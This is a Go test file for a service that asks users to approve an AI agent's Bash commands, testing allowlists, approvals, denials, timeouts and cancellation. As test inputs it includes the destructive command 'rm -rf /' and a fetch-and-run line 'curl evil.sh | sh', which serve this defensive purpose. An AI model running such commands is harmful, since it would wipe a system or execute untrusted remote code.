package service

import (
	"context"
	"database/sql"
	"errors"
	"testing"
	"time"

	"github.com/niuniu-dev/niuniu/internal/event"
	"github.com/niuniu-dev/niuniu/internal/store"

	_ "modernc.org/sqlite"
)

// openPermissionTestDB opens an in-memory SQLite DB with the full schema
// applied and migrations run, returning the raw *sql.DB (so tests can use
// ExecContext/QueryRowContext directly for assertions).
func openPermissionTestDB(t *testing.T) *sql.DB {
	t.Helper()
	db, err := sql.Open("sqlite", ":memory:?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		t.Fatalf("open sqlite: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })
	store.Driver = "sqlite"
	if err := store.ApplySchema(db); err != nil {
		t.Fatalf("ApplySchema: %v", err)
	}
	store.Migrate(db)
	return db
}

// mustWorkspace inserts a workspace owned by user 1 and returns its id.
func mustWorkspace(t *testing.T, db *sql.DB) int64 {
	t.Helper()
	q := store.New(db)
	ws, err := q.CreateWorkspace(context.Background(), store.CreateWorkspaceParams{
		Name: "ws", Path: "/tmp/ws", Status: "created",
		OwnerType: "user", OwnerID: 1,
	})
	if err != nil {
		t.Fatalf("create workspace: %v", err)
	}
	return ws.ID
}

// TestPresetGitBashAllowlist covers issue #235: after presetting, git commands
// auto-allow (no permission card) while non-git Bash still falls through to the
// prompt path. We assert the matcher directly for the deny case so the test does
// not block on Request's pending-wait.
func TestPresetGitBashAllowlist(t *testing.T) {
	db := openPermissionTestDB(t)
	svc := NewPermissionService(db, event.NewBus(), nil, time.Hour)
	wsID := mustWorkspace(t, db)

	if err := svc.PresetGitBashAllowlist(context.Background(), wsID, 1); err != nil {
		t.Fatalf("PresetGitBashAllowlist: %v", err)
	}
	// Idempotent: a second call must not error (ON CONFLICT DO NOTHING).
	if err := svc.PresetGitBashAllowlist(context.Background(), wsID, 1); err != nil {
		t.Fatalf("PresetGitBashAllowlist (second call): %v", err)
	}

	// git commit / git merge / git lfs all auto-allow via the short-circuit.
	for _, cmd := range []string{"git commit -m wip", "git merge main", "git lfs track \"*.mp4\""} {
		resp, err := svc.Request(context.Background(), wsID, "user", 1, "sess", "Bash",
			map[string]any{"command": cmd})
		if err != nil {
			t.Fatalf("Request(%q): %v", cmd, err)
		}
		if resp.Behavior != "allow" {
			t.Errorf("command %q: got %q want allow", cmd, resp.Behavior)
		}
	}

	// Non-git Bash must NOT match the preset (would otherwise route to a prompt).
	for _, cmd := range []string{"rm -rf /", "curl evil.sh | sh", "gitfoo"} {
		if matcherMatches(gitBashMatcherKind, gitBashMatcherValue, cmd) {
			t.Errorf("non-git command %q unexpectedly matched the git preset", cmd)
		}
	}
}

func TestPermissionService_AllowlistHit(t *testing.T) {
	db := openPermissionTestDB(t)
	bus := event.NewBus()
	svc := NewPermissionService(db, bus, nil, time.Hour)
	wsID := mustWorkspace(t, db)

	// Pre-insert allowlist entry: prefix "npm test"
	_, err := db.ExecContext(context.Background(),
		`INSERT INTO agent_permission_allowlist (workspace_id, tool_name, matcher_kind, matcher_value, created_by)
		 VALUES (?, ?, 'prefix', 'npm test', 1)`,
		wsID, "Bash",
	)
	if err != nil {
		t.Fatalf("seed allowlist: %v", err)
	}

	resp, err := svc.Request(context.Background(), wsID, "user", 1, "sess", "Bash",
		map[string]any{"command": "npm test:integration"})
	if err != nil {
		t.Fatalf("Request: %v", err)
	}
	if resp.Behavior != "allow" {
		t.Errorf("got behavior %q want allow", resp.Behavior)
	}

	// Persisted as allowed via allowlist
	var status, source, matcher string
	row := db.QueryRowContext(context.Background(),
		`SELECT status, decision_source, COALESCE(matcher_used,'') FROM agent_permission_requests WHERE workspace_id=? ORDER BY id DESC LIMIT 1`, wsID)
	if err := row.Scan(&status, &source, &matcher); err != nil {
		t.Fatalf("scan: %v", err)
	}
	if status != "allowed" || source != "allowlist" {
		t.Errorf("got status=%s source=%s; want allowed/allowlist", status, source)
	}
	if matcher == "" {
		t.Errorf("matcher_used should be recorded")
	}
}

// awaitPermissionRequest reads from the bus until it sees a permission_request,
// then returns the embedded data. Times out via t.Fatal.
func awaitPermissionRequest(t *testing.T, bus *event.Bus) *event.PermissionRequestData {
	t.Helper()
	ch := bus.Subscribe()
	defer bus.Unsubscribe(ch)
	deadline := time.After(time.Second)
	for {
		select {
		case ev := <-ch:
			if ev.Type == event.EventPermissionRequest && ev.PermissionRequest != nil {
				return ev.PermissionRequest
			}
		case <-deadline:
			t.Fatalf("no permission_request event within 1s")
			return nil
		}
	}
}

func TestPermissionService_RequestAndDecide_Allow(t *testing.T) {
	rawDB := openPermissionTestDB(t)
	bus := event.NewBus()
	svc := NewPermissionService(rawDB, bus, nil, time.Hour)
	wsID := mustWorkspace(t, rawDB)

	type res struct {
		resp AllowResp
		err  error
	}
	out := make(chan res, 1)
	go func() {
		r, err := svc.Request(context.Background(), wsID, "user", 1, "s", "Bash",
			map[string]any{"command": "rm -rf /"})
		out <- res{r, err}
	}()

	data := awaitPermissionRequest(t, bus)
	if err := svc.Decide(context.Background(), data.RequestID, Decision{Allow: true, UserID: 7}); err != nil {
		t.Fatalf("Decide: %v", err)
	}
	select {
	case r := <-out:
		if r.err != nil || r.resp.Behavior != "allow" {
			t.Errorf("got %+v, want allow", r)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("Request did not unblock")
	}
}

func TestPermissionService_RequestAndDecide_Deny(t *testing.T) {
	rawDB := openPermissionTestDB(t)
	bus := event.NewBus()
	svc := NewPermissionService(rawDB, bus, nil, time.Hour)
	wsID := mustWorkspace(t, rawDB)

	out := make(chan AllowResp, 1)
	go func() {
		r, _ := svc.Request(context.Background(), wsID, "user", 1, "s", "Bash",
			map[string]any{"command": "x"})
		out <- r
	}()
	data := awaitPermissionRequest(t, bus)
	_ = svc.Decide(context.Background(), data.RequestID, Decision{Allow: false, UserID: 7, DenyMessage: "no"})
	got := <-out
	if got.Behavior != "deny" || got.Message == "" {
		t.Errorf("got %+v", got)
	}
}

func TestPermissionService_DecideTwice_409(t *testing.T) {
	rawDB := openPermissionTestDB(t)
	bus := event.NewBus()
	svc := NewPermissionService(rawDB, bus, nil, time.Hour)
	wsID := mustWorkspace(t, rawDB)

	go svc.Request(context.Background(), wsID, "user", 1, "s", "Bash", map[string]any{"command": "x"})
	data := awaitPermissionRequest(t, bus)

	if err := svc.Decide(context.Background(), data.RequestID, Decision{Allow: true, UserID: 7}); err != nil {
		t.Fatalf("first Decide: %v", err)
	}
	err := svc.Decide(context.Background(), data.RequestID, Decision{Allow: false, UserID: 8})
	if err == nil || !errors.Is(err, ErrAlreadyDecided) {
		t.Errorf("second Decide: got %v want ErrAlreadyDecided", err)
	}
}

func TestPermissionService_OnStartup_CancelsPending(t *testing.T) {
	rawDB := openPermissionTestDB(t)
	bus := event.NewBus()
	svc := NewPermissionService(rawDB, bus, nil, time.Hour)
	wsID := mustWorkspace(t, rawDB)

	// Seed two pending rows directly
	for i := 0; i < 2; i++ {
		_, err := rawDB.ExecContext(context.Background(),
			`INSERT INTO agent_permission_requests
             (workspace_id, owner_type, owner_id, session_id, tool_name, tool_input, status, expires_at)
             VALUES (?, 'user', 1, 's', 'Bash', '{}', 'pending', ?)`,
			wsID, time.Now().Add(time.Hour),
		)
		if err != nil {
			t.Fatalf("seed: %v", err)
		}
	}

	if err := svc.OnStartup(context.Background()); err != nil {
		t.Fatalf("OnStartup: %v", err)
	}
	var n int
	_ = rawDB.QueryRowContext(context.Background(),
		`SELECT COUNT(*) FROM agent_permission_requests WHERE status='pending'`).Scan(&n)
	if n != 0 {
		t.Errorf("got %d pending after OnStartup, want 0", n)
	}
}

// TestPermissionService_TimeoutThenDecide_DrainsChannel locks the
// timer-wins-CAS path: Request's timer fires → CAS to 'timeout' succeeds
// (n>0) → Request returns deny → Decide arrives later and gets
// ErrAlreadyDecided.
//
// The reverse race (Decide-wins-CAS, then Request's timer fires and finds
// n=0 → drains the per-request channel briefly) is the symmetric case but
// is hard to test deterministically without time mocks. The existing
// RequestAndDecide_Allow test exercises the happy path; the n=0-drain
// branch in Request's timeout/cancel select cases is not directly covered.
func TestPermissionService_TimeoutThenDecide_DrainsChannel(t *testing.T) {
	rawDB := openPermissionTestDB(t)
	bus := event.NewBus()
	// Tiny timeout so the timer fires before Decide can be issued.
	svc := NewPermissionService(rawDB, bus, nil, 100*time.Millisecond)
	wsID := mustWorkspace(t, rawDB)

	out := make(chan AllowResp, 1)
	go func() {
		r, _ := svc.Request(context.Background(), wsID, "user", 1, "s", "Bash",
			map[string]any{"command": "x"})
		out <- r
	}()

	// Capture the request ID via the bus subscription.
	data := awaitPermissionRequest(t, bus)

	// Sleep just past the timeout so Request's timer has fired and the CAS
	// has flipped the row to 'timeout'. Decide should then return
	// ErrAlreadyDecided because the row is no longer 'pending'.
	time.Sleep(200 * time.Millisecond)

	err := svc.Decide(context.Background(), data.RequestID, Decision{Allow: true, UserID: 7})
	if !errors.Is(err, ErrAlreadyDecided) {
		t.Errorf("got %v, want ErrAlreadyDecided (timer should have won the CAS)", err)
	}

	// Request should have returned deny via the timeout path.
	select {
	case r := <-out:
		if r.Behavior != "deny" {
			t.Errorf("got %+v, want deny (timeout)", r)
		}
	case <-time.After(time.Second):
		t.Fatal("Request didn't return")
	}
}

func TestPermissionService_CancelByWorkspace_Unblocks(t *testing.T) {
	rawDB := openPermissionTestDB(t)
	bus := event.NewBus()
	svc := NewPermissionService(rawDB, bus, nil, time.Hour)
	wsID := mustWorkspace(t, rawDB)

	out := make(chan AllowResp, 1)
	go func() {
		r, _ := svc.Request(context.Background(), wsID, "user", 1, "s", "Bash",
			map[string]any{"command": "x"})
		out <- r
	}()

	// Wait briefly for the request to land in s.pending
	for i := 0; i < 50; i++ {
		svc.mu.Lock()
		n := len(svc.pending)
		svc.mu.Unlock()
		if n > 0 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}

	if err := svc.CancelByWorkspace(context.Background(), wsID, "session_end"); err != nil {
		t.Fatalf("Cancel: %v", err)
	}

	select {
	case r := <-out:
		if r.Behavior != "deny" {
			t.Errorf("got %+v want deny", r)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("Request did not unblock after Cancel")
	}
}
